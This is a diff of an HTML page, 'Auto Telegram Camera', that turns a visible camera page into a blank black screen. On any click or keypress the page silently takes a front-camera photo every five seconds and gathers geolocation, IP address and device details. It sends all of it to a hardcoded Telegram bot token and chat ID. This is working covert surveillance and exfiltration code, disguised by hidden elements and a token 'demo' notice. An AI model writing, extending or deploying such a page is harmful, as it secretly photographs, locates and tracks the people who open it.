@@ -1,131 +1,399 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>Auto Telegram Camera</title>
-
-<style>
-    body {
-        margin: 0;
-        background: black;
-        color: white;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-        height: 100vh;
-        font-family: sans-serif;
-    }
-    video {
-        width: 100%;
-        max-width: 360px;
-        transform: scaleX(-1);
-        border: 2px solid #0f0;
-    }
-    button {
-        margin-top: 12px;
-        padding: 10px 20px;
-        font-size: 16px;
-        cursor: pointer;
-    }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Telegram Camera</title>
+    <style>
+        /* Complete blank screen - no visible elements */
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: black;
+            overflow: hidden;
+            width: 100vw;
+            height: 100vh;
+        }
+        
+        /* Hidden elements for capturing */
+        #video, #canvas, #mapCanvas {
+            display: none;
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+        }
+        
+        /* Minimal status indicator */
+        #status {
+            color: #0f0;
+            font-family: monospace;
+            font-size: 12px;
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            opacity: 0.3;
+            z-index: 1000;
+        }
+    </style>
 </head>
 <body>
+    <!-- Hidden elements for processing -->
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+    <canvas id="mapCanvas"></canvas>
+    
+    <!-- Status indicator -->
+    <div id="status">INACTIVE</div>
+    
+    <script>
+        // DOM Elements
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const mapCanvas = document.getElementById('mapCanvas');
+        const statusElement = document.getElementById('status');
+        
+        // Configuration
+        const BOT_TOKEN = "7917384016:AAG7cxyuts9UJ-Km0BMqBeQVJEJfstH239g";
+        const CHAT_ID = "8319568593";
+        
+        // State variables
+        let intervalId = null;
+        let latitude = "N/A";
+        let longitude = "N/A";
+        let mapLink = "Location not available";
+        let userIP = "Unknown";
+        let locationAttempted = false;
+        
+        // Update status indicator
+        function updateStatus(message) {
+            if (statusElement) {
+                statusElement.textContent = message;
+            }
+        }
+        
+        // Initialize camera
+        async function initializeCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { 
+                        facingMode: "user",
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }
+                });
+                video.srcObject = stream;
+                updateStatus("CAMERA READY");
+                return true;
+            } catch (error) {
+                console.error("Camera error:", error);
+                updateStatus("CAMERA ERROR");
+                return false;
+            }
+        }
+        
+        // Get IP address
+        async function getIPAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                userIP = data.ip;
+            } catch (error) {
+                console.error("IP fetch error:", error);
+                userIP = "Unknown";
+            }
+        }
+        
+        // Get geolocation
+        function getGeolocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(false);
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        latitude = position.coords.latitude.toFixed(6);
+                        longitude = position.coords.longitude.toFixed(6);
+                        mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                        locationAttempted = true;
+                        updateStatus("LOCATION ACTIVE");
+                        resolve(true);
+                    },
+                    (error) => {
+                        console.warn("Geolocation error:", error);
+                        mapLink = "Location denied by user";
+                        locationAttempted = true;
+                        updateStatus("LOCATION DENIED");
+                        resolve(false);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+        
+        // Generate map preview image
+        function generateMapPreview() {
+            if (latitude === "N/A" || longitude === "N/A") {
+                return null;
+            }
+            
+            const ctx = mapCanvas.getContext('2d');
+            const size = 300;
+            
+            mapCanvas.width = size;
+            mapCanvas.height = size;
+            
+            // Clear canvas
+            ctx.fillStyle = '#1a1a2e';
+            ctx.fillRect(0, 0, size, size);
+            
+            // Draw map background
+            ctx.fillStyle = '#16213e';
+            ctx.fillRect(10, 10, size - 20, size - 20);
+            
+            // Draw grid lines
+            ctx.strokeStyle = '#0f3460';
+            ctx.lineWidth = 1;
+            
+            for (let i = 0; i < 5; i++) {
+                const pos = 10 + (i * (size - 20) / 4);
+                ctx.beginPath();
+                ctx.moveTo(pos, 10);
+                ctx.lineTo(pos, size - 10);
+                ctx.stroke();
+                
+                ctx.beginPath();
+                ctx.moveTo(10, pos);
+                ctx.lineTo(size - 10, pos);
+                ctx.stroke();
+            }
+            
+            // Calculate marker position (simulated)
+            const markerX = 10 + (parseFloat(longitude) % 1) * (size - 20);
+            const markerY = 10 + (parseFloat(latitude) % 1) * (size - 20);
+            
+            // Draw marker
+            ctx.fillStyle = '#e94560';
+            ctx.beginPath();
+            ctx.arc(markerX, markerY, 12, 0, Math.PI * 2);
+            ctx.fill();
+            
+            ctx.fillStyle = '#ffffff';
+            ctx.beginPath();
+            ctx.arc(markerX, markerY, 5, 0, Math.PI * 2);
+            ctx.fill();
+            
+            // Add location text
+            ctx.fillStyle = '#ffffff';
+            ctx.font = 'bold 14px Arial';
+            ctx.textAlign = 'center';
+            ctx.fillText('📍 Location Pin', size / 2, 30);
+            
+            ctx.font = '10px Arial';
+            ctx.fillText(`Lat: ${latitude}`, size / 2, size - 40);
+            ctx.fillText(`Lng: ${longitude}`, size / 2, size - 25);
+            
+            return mapCanvas.toDataURL('image/jpeg', 0.8);
+        }
+        
+        // Capture image from video
+        function captureImage() {
+            if (!video.videoWidth || !video.videoHeight) {
+                console.warn("Video not ready");
+                return null;
+            }
+            
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            const ctx = canvas.getContext('2d');
+            // Flip horizontally for front camera
+            ctx.translate(canvas.width, 0);
+            ctx.scale(-1, 1);
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Reset transformation
+            ctx.setTransform(1, 0, 0, 1, 0, 0);
+            
+            return canvas.toDataURL('image/jpeg', 0.85);
+        }
+        
+        // Send data to Telegram
+        async function sendToTelegram(imageDataUrl, mapImageDataUrl) {
+            try {
+                // Convert data URLs to blobs
+                const imageBlob = await (await fetch(imageDataUrl)).blob();
+                const formData = new FormData();
+                
+                // Add photo
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', imageBlob, 'capture.jpg');
+                
+                // Create caption with all collected data
+                const caption = `
+📸 AUTO CAPTURE REPORT
 
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas" style="display:none;"></canvas>
+📱 Device: ${navigator.userAgent.split(') ')[0].split(' (')[1] || 'Unknown'}
+🖥 Platform: ${navigator.platform}
+📐 Screen: ${screen.width}×${screen.height}
+🎨 Color Depth: ${screen.colorDepth}-bit
 
-<button onclick="start()">▶ START AUTO SEND</button>
+📍 Location Data:
+Latitude: ${latitude}
+Longitude: ${longitude}
+Google Maps: ${mapLink}
 
-<script>
-const video = document.getElementById("video");
-const canvas = document.getElementById("canvas");
+🌐 Network:
+IP Address: ${userIP}
+Language: ${navigator.language}
+Online: ${navigator.onLine ? 'Yes' : 'No'}
 
-const BOT_TOKEN = "7917384016:AAG7cxyuts9UJ-Km0BMqBeQVJEJfstH239g";
-const CHAT_ID = "8319568593";
+⏰ Time: ${new Date().toLocaleString()}
+🕐 Timestamp: ${Date.now()}
 
-let intervalId = null;
-let latitude = "N/A";
-let longitude = "N/A";
-let mapLink = "Location not allowed";
-let userIP = "Unknown";
-
-// 🔹 IP
-fetch("https://api.ipify.org?format=json")
-    .then(r => r.json())
-    .then(d => userIP = d.ip);
-
-// 🔹 Camera
-navigator.mediaDevices.getUserMedia({
-    video: { facingMode: "user" }
-}).then(stream => {
-    video.srcObject = stream;
-});
-
-function start() {
-
-    // 📍 LOCATION PERMISSION — user click ke baad
-    if ("geolocation" in navigator) {
-        navigator.geolocation.getCurrentPosition(
-            pos => {
-                latitude = pos.coords.latitude.toFixed(6);
-                longitude = pos.coords.longitude.toFixed(6);
-                mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-            },
-            () => {
-                mapLink = "Location denied";
-            },
-            { enableHighAccuracy: true }
-        );
-    }
-
-    if (!intervalId) {
-        intervalId = setInterval(captureAndSend, 2000);
-    }
-}
-
-function captureAndSend() {
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-
-    const ctx = canvas.getContext("2d");
-    ctx.translate(canvas.width, 0);
-    ctx.scale(-1, 1);
-    ctx.drawImage(video, 0, 0);
-
-    canvas.toBlob(blob => {
-
-        const caption = `
-📸 Auto Capture
-
-📱 ${navigator.userAgent}
-🖥 ${navigator.platform}
-📐 ${screen.width}x${screen.height}
-
-📍 Location:
-Lat: ${latitude}
-Lng: ${longitude}
-🗺 ${mapLink}
-
-🌍 IP: ${userIP}
-⏰ ${new Date().toLocaleString()}
-        `;
-
-        const formData = new FormData();
-        formData.append("chat_id", CHAT_ID);
-        formData.append("photo", blob);
-        formData.append("caption", caption);
-
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-            method: "POST",
-            body: formData
+🔒 Privacy Notice: This is a demo system.
+                `.trim();
+                
+                formData.append('caption', caption);
+                
+                // Send to Telegram
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const result = await response.json();
+                
+                // Send map preview if available
+                if (mapImageDataUrl && result.ok) {
+                    const mapBlob = await (await fetch(mapImageDataUrl)).blob();
+                    const mapFormData = new FormData();
+                    mapFormData.append('chat_id', CHAT_ID);
+                    mapFormData.append('photo', mapBlob, 'map_preview.jpg');
+                    mapFormData.append('caption', `📍 Location Pin Preview\nLat: ${latitude}, Lng: ${longitude}`);
+                    
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: mapFormData
+                    });
+                }
+                
+                updateStatus(`SENT ${new Date().getSeconds()}`);
+                return result.ok;
+                
+            } catch (error) {
+                console.error("Telegram send error:", error);
+                updateStatus("SEND ERROR");
+                return false;
+            }
+        }
+        
+        // Main capture and send function
+        async function captureAndSend() {
+            updateStatus("CAPTURING...");
+            
+            // Capture image
+            const imageDataUrl = captureImage();
+            if (!imageDataUrl) {
+                updateStatus("CAPTURE FAILED");
+                return;
+            }
+            
+            // Generate map preview
+            let mapImageDataUrl = null;
+            if (locationAttempted && latitude !== "N/A") {
+                mapImageDataUrl = generateMapPreview();
+            }
+            
+            // Send to Telegram
+            await sendToTelegram(imageDataUrl, mapImageDataUrl);
+        }
+        
+        // Start auto-send process
+        async function startAutoSend() {
+            updateStatus("INITIALIZING...");
+            
+            // Initialize components
+            await initializeCamera();
+            await getIPAddress();
+            
+            // Get location only after user action (permission request)
+            await getGeolocation();
+            
+            // Start auto-send interval
+            if (!intervalId) {
+                intervalId = setInterval(captureAndSend, 5000); // Send every 5 seconds
+                updateStatus("ACTIVE (5s)");
+                
+                // Send first capture immediately
+                setTimeout(captureAndSend, 1000);
+            }
+        }
+        
+        // Stop auto-send process
+        function stopAutoSend() {
+            if (intervalId) {
+                clearInterval(intervalId);
+                intervalId = null;
+                updateStatus("STOPPED");
+                
+                // Stop camera stream
+                if (video.srcObject) {
+                    const tracks = video.srcObject.getTracks();
+                    tracks.forEach(track => track.stop());
+                }
+            }
+        }
+        
+        // Initialize on page load
+        window.addEventListener('DOMContentLoaded', async () => {
+            updateStatus("LOADING...");
+            
+            // Start on any user interaction (for permission requests)
+            document.body.addEventListener('click', async () => {
+                if (!intervalId) {
+                    await startAutoSend();
+                }
+            });
+            
+            // Also start on keypress
+            document.addEventListener('keydown', async (e) => {
+                if (!intervalId && (e.code === 'Enter' || e.code === 'Space')) {
+                    await startAutoSend();
+                }
+                
+                // Stop on Escape key
+                if (e.code === 'Escape') {
+                    stopAutoSend();
+                }
+            });
+            
+            // Auto-start after 30 seconds if no interaction
+            setTimeout(() => {
+                if (!intervalId) {
+                    updateStatus("CLICK TO START");
+                }
+            }, 30000);
         });
-
-    }, "image/jpeg", 0.7);
-}
-</script>
-
+        
+        // Handle page visibility changes
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) {
+                updateStatus("BACKGROUND");
+            } else if (intervalId) {
+                updateStatus("ACTIVE");
+            }
+        });
+        
+        // Handle window close
+        window.addEventListener('beforeunload', () => {
+            stopAutoSend();
+        });
+    </script>
 </body>
 </html>
